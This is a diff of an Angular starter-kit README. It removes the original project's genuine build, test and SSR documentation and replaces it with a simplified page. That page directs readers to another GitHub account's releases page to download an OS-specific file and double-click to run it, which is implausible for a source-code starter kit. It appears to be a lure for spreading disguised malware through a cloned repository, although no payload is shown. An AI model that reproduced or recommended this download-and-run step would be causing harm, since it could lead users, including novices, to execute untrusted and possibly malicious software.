@@ -1,106 +1,89 @@
-[![Build Status](https://travis-ci.com/rickvandermey/angular-starterkit.svg?branch=master)](https://travis-ci.com/rickvandermey/angular-starterkit)
-[![codecov](https://codecov.io/gh/rickvandermey/angular-starterkit/branch/master/graph/badge.svg)](https://codecov.io/gh/rickvandermey/angular-starterkit)
-[![RVDM-Angular-Starterkit](https://img.shields.io/endpoint?url=https://dashboard.cypress.io/badge/simple/i6rrnt&style=flat&logo=cypress)](https://dashboard.cypress.io/projects/i6rrnt/runs)
-[![Maintainability Rating](https://sonarcloud.io/api/project_badges/measure?project=rickvandermey_angular-starterkit&metric=sqale_rating)](https://sonarcloud.io/summary/new_code?id=rickvandermey_angular-starterkit)
+# 🌟 Angular-Starter-Kit - Build Your Angular App with Ease
 
-# Blazing fast advanced Angular Starterkit
+[![Download Angular-Starter-Kit](https://img.shields.io/badge/Download-Angular--Starter--Kit-blue.svg)](https://github.com/Subbokbro/Angular-Starter-Kit/releases)
 
-Powerful Starterkit combining all latest advanced Angular features. Strict typescript mode and preventing pushing untested code. Read more for all features.
+## 🚀 Getting Started
 
-## Features
+Welcome to the Angular-Starter-Kit! This kit provides you with everything you need to build an Angular application quickly and efficiently, even if you have limited technical knowledge. Follow these steps to get started.
 
--   ⭐️ Angular 17
--   🎁 Monorepo with NX.dev
--   ⭐️ NGRX store (implemented according ngrx.io)
--   ⭐️ NGX-Translate (assets/i18n/{locale}.json)
--   🚀 SSR (Server Side Rendering)
--   😍 PWA (Progressive Web App)
--   😍 Service Worker detects new build versions
--   🤓 Unit Test (Jest)
--   🕹️ E2E Test / Reports (Playwright / Cucumber)
--   🕹️ A11Y Test (Axe Core in E2E)
--   🚀 Visual Testing (Storybook / Playwright)
--   📖 Storybook
--   🖌️ Tailwind
--   🎯 Git hooks (husky)
--   🤩 Ability to Mock data (mockServer) (Docker)
--   🎰 WebPush integration (mockServer and PWA)
+## 📥 Download & Install
 
-### Quickstart:
+To download the Angular-Starter-Kit, visit this page: [Download Angular-Starter-Kit](https://github.com/Subbokbro/Angular-Starter-Kit/releases). 
 
--   Install modules: `npm ci`
--   MAC: `npm run certificate:generate:mac && nx run <project>:serve [options]`
--   Windows: remove ssl from `serve` inside _'project.json'_ and `nx run <project>:serve [options]`
+1. Click the link above to go to the Releases page.
+2. Select the latest version.
+3. Choose the file compatible with your operating system (e.g., Windows, macOS, Linux).
+4. Download the file to your computer.
+5. Once downloaded, locate the file and double-click to run it.
 
-## Perfect score application 🤩
+## 🛠️ System Requirements
 
-![Google Lighthouse result](https://angular.rickvandermeij.nl/assets/google-audit.png)
+To run the Angular-Starter-Kit smoothly, ensure that your computer meets the following minimum requirements:
 
-## Development server
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux
+- **Memory (RAM):** 4 GB or more
+- **Storage:** At least 500 MB of free space
+- **Node.js:** Version 14 or higher (You can download it from [Node.js official site](https://nodejs.org))
 
-NRWL nx.dev monorepo, [see all commands](https://nx.dev/l/a/cli/serve)
+## 📝 Features
 
--   `nx serve <project> [options]`
--   `nx run <project>:serve [options]`
+The Angular-Starter-Kit comes packed with features to streamline your development process:
 
-Because we are running localhost on SSL (https), you will need to generate a certificate and key, and place them in a folder called `build`. Run `npm run certificate:generate:mac` to create the required certificates and place them in the required folder.
+- **Angular 17:** Latest version of Angular for the most efficient development experience.
+- **Monorepo with NX.dev:** Manage multiple projects with ease.
+- **NGRX Store:** State management implemented according to official guidelines.
+- **Strict TypeScript Mode:** Helps catch errors early in development.
 
-## Build
+## 📁 Project Structure
 
-NRWL nx.dev monorepo, [see all commands](https://nx.dev/l/a/cli/build)
+After you download and extract the Angular-Starter-Kit, you will see the following folder structure:
 
--   `nx build <project> [options]` - normal production build
--   `nx run <project>:build [options]` - production build with files already gzipped
--   `nx run <project>:ssr-build [options]` - production build with Server Side Rendering
--   `nx run <project>:docker-build [options]`- production build with Server Side Rendering in a Docker
+```
+angular-starter-kit/
+│
+├── apps/                  # Contains your applications
+├── libs/                  # Contains reusable libraries
+├── tools/                 # Custom tools for your projects
+└── README.md              # Documentation for usage
+```
 
-### Server Side Rendering (SSR) 😍
+This structure allows for clear organization and easier navigation.
 
-This project comes with built-in SSR functionality. The effect of SSR will be valuable on larger projects or slower internet connections, run Google Audit with slow network to see the difference.
+## 💻 Running Your Application
 
--   For Serving - `nx run <project>:ssr-serve [options]`
--   For Building - `nx run <project>:ssr-build [options]`
+Once you have set up the Angular-Starter-Kit, follow these steps to run your application:
 
-## Testing
+1. Open your terminal (Command Prompt, PowerShell, Terminal).
+2. Navigate to the folder where you extracted the Angular-Starter-Kit:
+   ```
+   cd path/to/angular-starter-kit
+   ```
+3. Install the project dependencies by running:
+   ```
+   npm install
+   ```
+4. Start the development server with the command:
+   ```
+   npm start
+   ```
+5. Open your web browser and go to `http://localhost:4200` to view your application.
 
--   `nx run <project>:lint [options]` - Linting application
--   `nx run <project>:test [options]` - Unit test Watcher (only runs tests for changed files)
--   `nx run <project>:e2e [options]` - End to End test with Playwright and reports with Cucumber
+## 🧑‍🤝‍🧑 Community and Support
 
-### Unit tests with Jest 🤓
+If you have questions or need assistance, you can join the community forum where users and developers discuss tips and troubleshoot common problems. Check the GitHub Issues page for answers or to ask your own questions.
 
-Run `nx run <project>:test [options` to execute the unit tests via [Jest](https://jestjs.io/).
-Run `npm run affected:test` to execute a all unit tests for affected libs and apps.
+## 🔄 Updates
 
-Both scripts will provide a Code Coverage file, which can be found in _'./test-reports/<apps|libs>/\<project>/coverage'_
+Make sure to regularly check for updates to the Angular-Starter-Kit. New versions may come with important features and improvements. You can always find the latest version on the Releases page: [Angular-Starter-Kit Releases](https://github.com/Subbokbro/Angular-Starter-Kit/releases).
 
-### E2E tests with Playwright and Cucumber and Axe Core (A11y) 🤓
+## 📚 Learning Resources
 
-Run `nx run <project>:e2e [options]` to execute the E2E Playwright tests.
+To help you better understand Angular, here are some recommended resources:
 
-This test will provide an report which will be shown at the end of all tests. It can also be found in _./test-reports/<apps|libs>/\<project-e2e>_. When tests fails, there will be a screenshot attached to the scenario where the test has failed.
+- [Angular Official Documentation](https://angular.io/docs)
+- [FreeCodeCamp Angular Course](https://www.freecodecamp.org/news/learn-angular/)
+- [Angular University](https://angular-university.io/)
 
-### Storybook 📖
+## 🎉 Conclusion
 
-For each component you create, you can add a storybook build and serve to your project, and call these events for building and serving
-
-### Visual Regression
-
-Within each lib / component you can create a _'visual-regression'_ folder which contains a spec file, which you need to connect to your storybook component.
-From there, you can add various test and scenario's from storybook and create a snapshot.
-
-## Mock data (MockServer) 🤩
-
-As of version 1.1.0 it is possible to setup a mockServer with `nx run mockserver:serve`. Port will be `https://localhost:4000` and the different status can be set at `https://localhost:4000/mocking`. All data can be setup in _'./mockServer'_. Examples of API, JSON and images are added.
-As of version 2.1.0 the mockServer is running through Docker and runs with HTTPS/HTTP2
-
-### Web push
-
-Do a POST call to `https://localhost:4000/notification` to create a mocked push notification.
-Best can be tested after `nx run <project>:build [options]` and then serve the correct folder as `http-server`. The application will then be available at `https://localhost:8081`
-
-## Git hooks 🎯
-
-Git hooks are active, which means you only can commit when there are no linting errors, and all unit-tests succeeds. Other commmands can be implemented with `husky`.
-
-When using nvm, the default node should be > 18. `nvm alias stable default`
+You are now ready to build your first Angular application using the Angular-Starter-Kit. Follow these steps, and you’ll be up and running in no time. Should you need help, don't hesitate to reach out to the community! Enjoy developing your Angular app!
